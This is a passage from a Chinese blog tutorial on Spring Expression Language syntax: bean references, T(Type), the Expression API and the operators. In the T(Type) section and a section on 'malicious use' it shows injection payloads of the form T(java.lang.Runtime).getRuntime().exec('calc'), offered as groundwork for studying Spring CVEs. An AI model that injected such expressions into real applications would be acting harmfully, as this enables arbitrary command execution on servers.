class="string">"#&#123;kenny.song&#125;"</span>/&gt;</span></span><br><span class="line">&gt;<span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>key指定kenny<code>&lt;bean&gt;</code> 的id，value指定kenny<code>&lt;bean&gt;</code>的song属性。其等价于执行下面的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;Instrumentalist carl = new Instrumentalist();</span><br><span class="line">&gt;carl.setSong(kenny.getSong());</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><h5 id="引用类方法"><a href="#引用类方法" class="headerlink" title="引用类方法"></a>引用类方法</h5><blockquote><p>SpEL表达式还可以访问类的方法。</p><p>假设现在有个SongSelector类，该类有个<code>selectSong()</code>方法，这样的话carl就可以不用模仿别人，开始唱songSelector所选的歌了：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"song"</span> <span class="attr">value</span>=<span class="string">"#&#123;SongSelector.selectSong()&#125;"</span>/&gt;</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>carl有个癖好，歌曲名不是大写的他就浑身难受，我们现在要做的就是仅仅对返回的歌曲调用<code>toUpperCase()</code>方法：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"song"</span> <span class="attr">value</span>=<span class="string">"#&#123;SongSelector.selectSong().toUpperCase()&#125;"</span>/&gt;</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>注意：这里我们不能确保不抛出<code>NullPointerException</code>，为了避免这个讨厌的问题，我们可以使用SpEL的<code>null-safe</code>存取器</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"song"</span> <span class="attr">value</span>=<span class="string">"#&#123;SongSelector.selectSong()?.toUpperCase()&#125;"</span>/&gt;</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p><code>?.</code>符号会确保左边的表达式不会为<code>null</code>，如果为<code>null</code>的话就不会调用<code>toUpperCase()</code>方法了。</p></blockquote><h5 id="Demo——引用Bean"><a href="#Demo——引用Bean" class="headerlink" title="Demo——引用Bean"></a>Demo——引用Bean</h5><p>这里我们修改基于构造函数的依赖注入的示例。</p><p>SpellChecker.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mi1k7ea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SpellChecker</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">SpellChecker</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Inside SpellChecker constructor."</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">checkSpelling</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Inside checkSpelling."</span> );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>TextEditor.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mi1k7ea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TextEditor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> SpellChecker spellChecker;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TextEditor</span><span class="params">(SpellChecker spellChecker)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Inside TextEditor constructor."</span> );</span><br><span class="line">        <span class="keyword">this</span>.spellChecker = spellChecker;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">spellCheck</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        spellChecker.checkSpelling();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MainApp.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mi1k7ea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainApp</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ApplicationContext context = <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">"Beans.xml"</span>);</span><br><span class="line">        TextEditor te = (TextEditor) context.getBean(<span class="string">"textEditor"</span>);</span><br><span class="line">        te.spellCheck();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Beans.xml，通过<code>value=&quot;#{bean id}&quot;</code>的方式替换掉之前的ref属性设置：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">    http://www.springframework.org/schema/beans/spring-beans-3.0.xsd "</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Definition for textEditor bean --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"textEditor"</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.TextEditor"</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--&lt;constructor-arg ref="spellChecker"/&gt;--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">value</span>=<span class="string">"#&#123;spellChecker&#125;"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Definition for spellChecker bean --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"spellChecker"</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.SpellChecker"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>运行输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Inside SpellChecker constructor.</span><br><span class="line">Inside TextEditor constructor.</span><br><span class="line">Inside checkSpelling.</span><br></pre></td></tr></table></figure><h3 id="类类型表达式T-Type"><a href="#类类型表达式T-Type" class="headerlink" title="类类型表达式T(Type)"></a>类类型表达式T(Type)</h3><p>在SpEL表达式中，使用<code>T(Type)</code>运算符会调用类的作用域和方法。换句话说，就是可以通过该类类型表达式来操作类。</p><p>使用<code>T(Type)</code>来表示java.lang.Class实例，Type必须是类全限定名，但”java.lang”包除外，因为SpEL已经内置了该包，即该包下的类可以不指定具体的包名；使用类类型表达式还可以进行访问类静态方法和类静态字段。</p><p>在XML配置文件中的使用示例，要调用java.lang.Math来获取0~1的随机数：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"random"</span> <span class="attr">value</span>=<span class="string">"#&#123;T(java.lang.Math).random()&#125;"</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>Expression中使用示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line"><span class="comment">// java.lang 包类访问</span></span><br><span class="line">Class&lt;String&gt; result1 = parser.parseExpression(<span class="string">"T(String)"</span>).getValue(Class.class);</span><br><span class="line">System.out.println(result1);</span><br><span class="line"><span class="comment">//其他包类访问</span></span><br><span class="line">String expression2 = <span class="string">"T(java.lang.Runtime).getRuntime().exec('open /Applications/Calculator.app')"</span>;</span><br><span class="line">Class&lt;Object&gt; result2 = parser.parseExpression(expression2).getValue(Class.class);</span><br><span class="line">System.out.println(result2);</span><br><span class="line"><span class="comment">//类静态字段访问</span></span><br><span class="line"><span class="keyword">int</span> result3 = parser.parseExpression(<span class="string">"T(Integer).MAX_VALUE"</span>).getValue(<span class="keyword">int</span>.class);</span><br><span class="line">System.out.println(result3);</span><br><span class="line"><span class="comment">//类静态方法调用</span></span><br><span class="line"><span class="keyword">int</span> result4 = parser.parseExpression(<span class="string">"T(Integer).parseInt('1')"</span>).getValue(<span class="keyword">int</span>.class);</span><br><span class="line">System.out.println(result4);</span><br></pre></td></tr></table></figure><h4 id="Demo-1"><a href="#Demo-1" class="headerlink" title="Demo"></a>Demo</h4><p>在前面字面值的Demo中修改Beans.xml即可：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">    http://www.springframework.org/schema/beans/spring-beans-3.0.xsd "</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"helloWorld"</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.HelloWorld"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"message"</span> <span class="attr">value</span>=<span class="string">"#&#123;T(java.lang.Math).random()&#125;"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>运行输出随机值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Your Message : 0.7593490190723996</span><br></pre></td></tr></table></figure><h4 id="恶意利用——弹计算器"><a href="#恶意利用——弹计算器" class="headerlink" title="恶意利用——弹计算器"></a>恶意利用——弹计算器</h4><p>修改value中类类型表达式的类为Runtime并调用其命令执行方法即可：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">    http://www.springframework.org/schema/beans/spring-beans-3.0.xsd "</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"helloWorld"</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.HelloWorld"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"message"</span> <span class="attr">value</span>=<span class="string">"#&#123;T(java.lang.Runtime).getRuntime().exec('calc')&#125;"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>运行即可弹计算器。</p><h3 id="SpEL用法"><a href="#SpEL用法" class="headerlink" title="SpEL用法"></a>SpEL用法</h3><p>SpEL的用法有三种形式，一种是在注解@Value中；一种是XML配置；最后一种是在代码块中使用Expression。</p><p>前面的就是以XML配置为例对SpEL表达式的用法进行的说明，而注解@Value的用法例子如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EmailSender</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Value</span>(<span class="string">"$&#123;spring.mail.username&#125;"</span>)</span><br><span class="line">    <span class="keyword">private</span> String mailUsername;</span><br><span class="line">    <span class="meta">@Value</span>(<span class="string">"#&#123; systemProperties['user.region'] &#125;"</span>)    </span><br><span class="line">    <span class="keyword">private</span> String defaultLocale;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面具体看下Expression的。</p><h4 id="Expression用法"><a href="#Expression用法" class="headerlink" title="Expression用法"></a>Expression用法</h4><p>由于后续分析的各种Spring CVE漏洞都是基于Expression形式的SpEL表达式注入，因此这里再单独说明SpEL表达式Expression这种形式的用法。</p><h5 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h5><blockquote><p>SpEL 在求表达式值时一般分为四步，其中第三步可选：首先构造一个解析器，其次解析器解析字符串表达式，在此构造上下文，最后根据上下文得到表达式运算后的值。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">Expression expression = parser.parseExpression(<span class="string">"('Hello' + ' Mi1k7ea').concat(#end)"</span>);</span><br><span class="line">EvaluationContext context = <span class="keyword">new</span> StandardEvaluationContext();</span><br><span class="line">context.setVariable(<span class="string">"end"</span>, <span class="string">"!"</span>);</span><br><span class="line">System.out.println(expression.getValue(context));</span><br></pre></td></tr></table></figure><p>具体步骤如下：</p><ol><li>创建解析器：SpEL 使用 ExpressionParser 接口表示解析器，提供 SpelExpressionParser 默认实现；</li><li>解析表达式：使用 ExpressionParser 的 parseExpression 来解析相应的表达式为 Expression 对象；</li><li>构造上下文：准备比如变量定义等等表达式需要的上下文数据；</li><li>求值：通过 Expression 接口的 getValue 方法根据上下文获得表达式值；</li></ol><h5 id="主要接口"><a href="#主要接口" class="headerlink" title="主要接口"></a>主要接口</h5><ul><li><strong>ExpressionParser 接口</strong>：表示解析器，默认实现是 org.springframework.expression.spel.standard 包中的 SpelExpressionParser 类，使用 parseExpression 方法将字符串表达式转换为 Expression 对象，对于 ParserContext 接口用于定义字符串表达式是不是模板，及模板开始与结束字符；</li><li><strong>EvaluationContext 接口</strong>：表示上下文环境，默认实现是 org.springframework.expression.spel.support 包中的 StandardEvaluationContext 类，使用 setRootObject 方法来设置根对象，使用 setVariable 方法来注册自定义变量，使用 registerFunction 来注册自定义函数等等。</li><li><strong>Expression 接口</strong>：表示表达式对象，默认实现是 org.springframework.expression.spel.standard 包中的 SpelExpression，提供 getValue 方法用于获取表达式值，提供 setValue 方法用于设置对象值。</li></ul><h5 id="Demo-2"><a href="#Demo-2" class="headerlink" title="Demo"></a>Demo</h5><p>应用示例如下，和前面XML配置的用法区别在于程序会将这里传入parseExpression()函数的字符串参数当初SpEL表达式来解析，而无需通过<code>#{}</code>符号来注明：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 字符串字面量</span></span><br><span class="line"><span class="comment">//String spel = "123+456";</span></span><br><span class="line"><span class="comment">// 算数运算</span></span><br><span class="line"><span class="comment">//String spel = "123+456";</span></span><br><span class="line"><span class="comment">// 操作类弹计算器，当然java.lang包下的类是可以省略包名的</span></span><br><span class="line">String spel = <span class="string">"T(java.lang.Runtime).getRuntime().exec(\"calc\")"</span>;</span><br><span class="line"><span class="comment">// String spel = "T(java.lang.Runtime).getRuntime().exec(\"calc\")";</span></span><br><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">Expression expression = parser.parseExpression(spel);</span><br><span class="line">System.out.println(expression.getValue());</span><br></pre></td></tr></table></figure><h5 id="类实例化"><a href="#类实例化" class="headerlink" title="类实例化"></a>类实例化</h5><p>类实例化同样使用Java关键字new，类名必须是全限定名，但java.lang包内的类型除外。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String spel = <span class="string">"new java.util.Date()"</span>;</span><br><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">Expression expression = parser.parseExpression(spel);</span><br><span class="line">System.out.println(expression.getValue());</span><br></pre></td></tr></table></figure><h3 id="SpEL表达式运算"><a href="#SpEL表达式运算" class="headerlink" title="SpEL表达式运算"></a>SpEL表达式运算</h3><p>下面内容引用自<a href="https://mrbird.cc/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F.html" target="_blank" rel="noopener">SpEL表达式</a>。</p><p>SpEL提供了以下几种运算符：</p><table><thead><tr><th style="text-align:left">运算符类型</th><th style="text-align:left">运算符</th></tr></thead><tbody><tr><td style="text-align:left">算数运算</td><td style="text-align:left">+, -, *, /, %, ^</td></tr><tr><td style="text-align:left">关系运算</td><td style="text-align:left">&lt;, &gt;, ==, &lt;=, &gt;=, lt, gt, eq, le, ge</td></tr><tr><td style="text-align:left">逻辑运算</td><td style="text-align:left">and, or, not, !</td></tr><tr><td style="text-align:left">条件运算</td><td style="text-align:left">?:(ternary), ?:(Elvis)</td></tr><tr><td style="text-align:left">正则表达式</td><td style="text-align:left">matches</td></tr></tbody></table><h4 id="算数运算"><a href="#算数运算" class="headerlink" title="算数运算"></a>算数运算</h4><p>加法运算：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"add"</span> <span class="attr">value</span>=<span class="string">"#&#123;counter.total+42&#125;"</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>加号还可以用于字符串拼接：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"blogName"</span> <span class="attr">value</span>=<span class="string">"#&#123;my blog name is+' '+mrBird &#125;"</span>/&gt;</span></span><br></pre></td></tr></table></figure><p><code>^</code>运算符执行幂运算，其余算数运算符和Java一毛一样，这里不再赘述。</p><h4 id="关系运算"><a href="#关系运算" class="headerlink" title="关系运算"></a>关系运算</h4><p>判断一个Bean的某个属性是否等于100：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"eq"</span> <span class="attr">value</span>=<span class="string">"#&#123;counter.total==100&#125;"</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>返回值是boolean类型。关系运算符唯一需要注意的是：在Spring XML配置文件中直接写&gt;=和&lt;=会报错。因为这”&lt;”和”&gt;”两个符号在XML中有特殊的含义。所以实际使用时，最号使用文本类型代替符号：</p><table><thead><tr><th style="text-align:left">运算符</th><th style="text-align:left">符号</th><th style="text-align:left">文本类型</th></tr></thead><tbody><tr><td style="text-align:left">等于</td><td style="text-align:left">==</td><td style="text-align:left">eq</td></tr><tr><td style="text-align:left">小于</td><td style="text-align:left">&lt;</td><td style="text-align:left">lt</td></tr><tr><td style="text-align:left">小于等于</td><td style="text-align:left">&lt;=</td><td style="text-align:left">le</td></tr><tr><td style="text-align:left">大于</td><td style="text-align:left">&gt;</td><td style="text-align:left">gt</td></tr><tr><td style="text-align:left">大于等于</td><td style="text-align:left">&gt;=</td><td style="text-align:left">ge</td></tr></tbody></table><p>如：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"eq"</span> <span class="attr">value</span>=<span class="string">"#&#123;counter.total le 100&#125;"</span>/&gt;</span></span><br></pre></td></tr></table></figure><h4 id="逻辑运算"><a href="#逻辑运算" class="headerlink" title="逻辑运算"></a>逻辑运算</h4><p>SpEL表达式提供了多种逻辑运算符，其含义和Java也是一毛一样，只不过符号不一样罢了。</p><p>使用and运算符：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"largeCircle"</span> <span class="attr">value</span>=<span class="string">"#&#123;shape.kind == 'circle' and shape.perimeter gt 10000&#125;"</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>两边为true时才返回true。</p><p>其余操作一样，只不过非运算有<code>not</code>和<code>!</code>两种符号可供选择。非运算：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"outOfStack"</span> <span class="attr">value</span>=<span class="string">"#&#123;!product.available&#125;"</span>/&gt;</span></span><br></pre></td></tr></table></figure><h4 id="条件运算"><a href="#条件运算" class="headerlink" title="条件运算"></a>条件运算</h4><p>条件运算符类似于Java的三目运算符：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"instrument"</span> <span class="attr">value</span>=<span class="string">"#&#123;songSelector.selectSong() == 'May Rain' ? piano:saxphone&#125;"</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>当选择的歌曲为”May Rain”的时候，一个id为piano的Bean将装配到instrument属性中，否则一个id为saxophone的Bean将装配到instrument属性中。注意区别piano和字符串“piano”！</p><p>一个常见的三目运算符的使用场合是判断是否为null值：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"song"</span> <span class="attr">value</span>=<span class="string">"#&#123;kenny.song !=null ? kenny.song:'Jingle Bells'&#125;"</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>这里，kenny.song引用重复了两次，SpEL提供了三目运算符的变体来简化表达式：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"song"</span> <span class="attr">value</span>=<span class="string">"#&#123;kenny.song !=null ?:'Jingle Bells'&#125;"</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>在以上示例中，如果kenny.song不为null，那么表达式的求值结果是kenny.song否则就是“Jingle Bells”。</p><h4 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h4><p>验证邮箱：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"email"</span> <span class="attr">value</span>=<span class="string">"#&#123;admin.email matches '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.com'&#125;"</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>虽然这个邮箱正则不够健壮，但对于演示matches来说足够啦。</p><h3 id="集合操作"><a href="#集合操作" class="headerlink" title="集合操作"></a>集合操作</h3><p>SpEL表达式支持对集合进行操作。</p><p>下面我们以示例看下能进行哪些集合操作。</p><p>我们先创建一个City类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mi1k7ea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">City</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String state;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> population;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getState</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> state;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setState</span><span class="params">(String state)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.state = state;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getPopulation</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> population;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span 